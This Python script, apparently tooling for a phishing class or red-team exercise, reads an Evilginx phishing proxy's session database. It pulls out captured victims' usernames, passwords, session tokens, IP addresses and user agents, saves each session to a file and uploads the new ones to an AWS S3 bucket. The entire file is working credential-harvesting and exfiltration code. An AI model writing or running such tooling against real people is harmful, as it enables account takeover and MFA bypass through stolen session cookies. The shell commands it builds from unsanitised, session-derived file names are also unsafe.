import json
import os
import datetime
from collections import OrderedDict

DB = '/root/.evilginx/data.db'
CONFIG = '/root/.evilginx/config.yaml'
BUCKETNAME = ""
PROFILENAME = ""
MAINPATH = "/tmp/comps/"
LASTRUN = "/tmp/lastrun"
BUCKETPREPEND = "rtnphishingclass-"

def copy_db():

    # check to see if the file exists
    os.system("cp {0} /tmp/data.db".format(DB))
    
    # Check if comps dir exists if not create it
    if os.path.exists(MAINPATH) is False:
        os.system('mkdir /tmp/comps')


def parse_db():

    sessiondict = OrderedDict()

    f = open('/tmp/data.db', 'r')

    for line in f:
        if '{"id":' in line:
            tmp_session = json.loads(line)
            
            session = OrderedDict()
            session['id'] = tmp_session['id']
            session['phishlet'] = tmp_session['phishlet']
            session['username'] = tmp_session['username']
            session['password'] = tmp_session['password']
            session['landing_url'] = tmp_session['landing_url']
            session['remote_ip'] = tmp_session['remote_addr']
            session['create_time'] = tmp_session['create_time']
            session['update_time'] = tmp_session['update_time']
            session['useragent'] = tmp_session['useragent']
            session['tokens'] = tmp_session['tokens']

            sessiondict[session['id']] = session
            
    f.close()

    return sessiondict

def is_string_in_file(filename, string_check):
    with open('{0}{1}'.format(MAINPATH, filename), 'r') as read_obj:
        for line in read_obj:
            if string_check in line:
                return True
    return False

def create_tmp_file(session, pretext):
    filename = '{0}_id_{1}_{2}'.format(pretext, session['id'], session['username'])

    # Compare Current with new
    cur_files = os.listdir(MAINPATH)
    for filen in cur_files:
        if filen == filename:
            # Compare here
            if is_string_in_file(filen, session['username']) is False or is_string_in_file(filen, session['password']) is False or is_string_in_file(filen, str(session['tokens'])) is False:
                # Something Changed
                print("New Data")
            else:
                return None


    f = open('{0}{1}'.format(MAINPATH, filename), 'w')

    for key,val in session.items():

        if key is 'id':
            f.write('{0}:\t\t{1}\n'.format(key, val))
            continue

        if key is 'tokens':
            f.write('\n{0}\n'.format(val))
            continue

        f.write('{0}:\t{1}\n'.format(key, val))

    f.close()

def get_time(filename):
    t = os.path.getmtime('{0}{1}'.format(MAINPATH, filename))
    return datetime.datetime.fromtimestamp(t)


def get_last_run():
    if os.path.exists(LASTRUN) is False:
        os.system('touch {0}'.format(LASTRUN))
        return datetime.datetime.now()

    else:
        f = open(LASTRUN, 'r')
        last_run = datetime.datetime.strptime(f.read(), '%y-%m-%d %H:%M:%S')
        f.close()
        return last_run

def gen_last_run():
    f = open(LASTRUN, 'w')
    f.write(str(datetime.datetime.now().strftime("%y-%m-%d %H:%M:%S")))
    f.close()

def is_new(last_run, file_date):
    if last_run >= file_date:
        return False
    else:
        return True


def get_net_new_fns(last_run):

    file_names = os.listdir(MAINPATH)

    new_files = list()

    for filen in file_names:
        if is_new(last_run, get_time(filen)):
            new_files.append(filen)
    

    return new_files

def getBucket():

    for bucket in str(os.popen('aws s3 ls').read()).split('\n'):
        if BUCKETPREPEND in bucket:
            return bucket.split(' ')[2]

def upload_file(filename, bucketname):
    AWSCMD = "aws s3 cp {2}{1} s3://{0}/{1} --region us-east-2".format(bucketname, filename, MAINPATH)
    os.system(AWSCMD)


def main():

    with open(CONFIG, 'r') as fh:
        for line in fh:
            if 'reddit:' in line:
                pretext = line.split(' ')[3].strip('\n')
    

    # Check if we even have an gnix db available
    if not os.path.exists(DB):
        return None

    last_run = get_last_run()

    # Copy over DB to avoid issues
    copy_db()

    # Parse out DB into Json Objs
    sessiondict = parse_db()

    for session in sessiondict.values():
        create_tmp_file(session, pretext)

    # Get All FNs That are New
    fileList = get_net_new_fns(last_run)
    
    # Push New Files To AWS
    for filen in fileList:
        upload_file(filen, getBucket())
    
    gen_last_run()

if __name__ == "__main__":
    main()

